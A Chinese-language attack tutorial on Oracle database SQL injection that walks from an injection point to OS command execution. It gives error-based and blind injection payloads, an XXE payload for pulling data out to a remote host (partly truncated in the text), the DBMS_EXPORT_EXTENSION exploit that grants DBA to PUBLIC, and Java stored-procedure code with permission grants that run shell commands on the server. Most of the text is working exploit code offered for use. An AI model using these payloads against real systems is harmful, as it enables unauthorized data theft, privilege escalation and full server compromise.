0×01 简介

oracle注入和其他数据库注入有很大的不同，其姿势灵活性其他几种数据库都是不能比的，

如果非要对比，可能和MSSQL比较相近。

我们平时遇到的oracle 无非就是10g 11g两种版本居多，下面就两种版本分别讨论下如何注入和如何讲注入点转化为系统级别Shell

0×02 注入篇

① 10g

这是个比较老的版本了，但使用率也是很高的

oracle注入字符型居多

比如有如下注入点

name=%C9 我们应该这样注入

name=%C9′ and 1=utl_inaddr.get_host_name((xxx))–

xxx 就是正儿八经的SQL语句了

这样相当于mysql的报错注入。 原理是利用utl_inaddr.get_host_name 向xxx发起请求，由于其结果是某个数据库字段，所以肯定连接超时，于是系统抛出报错信息。

类似于mysql oracle存在系统表

系统表user_tables和user_tab_columns

由于table_name和columun_name都是以大写存储在该表中，请一定使用大写的PASSWORD（此处大小写敏感）。

②11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 版本通杀注入（Via XXE）

11g和12g因为安全原因，只有dba权限才能向外通过http等传输数据。而这个xxe漏洞则完全绕开了高版本权限限制。普通权限即可快速获得大量敏感数据。

高版本的oracle 或者是不产生报错信息的oracle 我们往往通过盲注来测试是否存在注入，然后用xxe获取大量数据

XXX%'and 233=233 '%'=' 页面正常
XXX%'and 233=2333 '%'=' 页面无结果
XXX%'and 1=(select 1 from dual) '%'=' 页面正常 //这句话能确定是oracle了

构造如下语句 服务器收到如下请求：

XXX%'and 1=(select extractvalue(xmltype(' %remote; %param1;]>'),'/l') from dual) and '%'='

0×03 命令执行
命令执行分为在sqlin中把权限提升到数据库DBA和执行系统级别shell
这里都是在11g下的讨论
查看是否是dba权限
and 1=utl_inaddr.get_host_name((select password from sys.user$ where rownum=1))–

table or view not exits就不是

如果不是利用如下语句提权

and chr(44)=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX','SCH','DBMS_OUTPUT".PUT(:P1);execute immediate ''declare pragma autonomous_transaction; begin execute immediate ''''grant dba to public''''; end;''; END;--','SYS',1,'1',0)--

然后破解orale密码之后，用sqlplus连接上去提权
创建java包

create or replace and compile java source named runcmd as
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
public class RunCmd
{
private static void copyStream(InputStream inputStream, OutputStream outStream,String type) throws IOException {
byte[] bytes = new byte[1024];
int len = 0;
System.out.println("========"+type+"========");
while ( (len = inputStream.read(bytes)) != -1)
{
System.out.println(new String(bytes,0,len));
outStream.write(bytes,0,len);
}
}
public static void exec(String cmd)
{
try {
Process pc = Runtime.getRuntime().exec(cmd);
copyStream(pc.getInputStream(), System.out,"InputStream()");
copyStream(pc.getErrorStream(), System.out,"ErrorStream()");
} catch (IOException e) {
e.printStackTrace();
}
}
};

创建存储过程

CREATE OR REPLACE PROCEDURE SP_RUNCMD
(cmd string)
as language java name 'RunCmd.exec (java.lang.String)';

权限提升

exec Dbms_Java.Grant_Permission('当前用户名', 'java.io.FilePermission', '<ALL FILE>', 'read,write,execute,delete');
exec Dbms_Java.Grant_Permission('当前用户名','java.io.FilePermission','/bin/*','execute');
set serveroutput on;
call dbms_java.set_output (1000000);

执行命令：
call sp_runcmd (‘/bin/sh -c /sbin/ifconfig’);
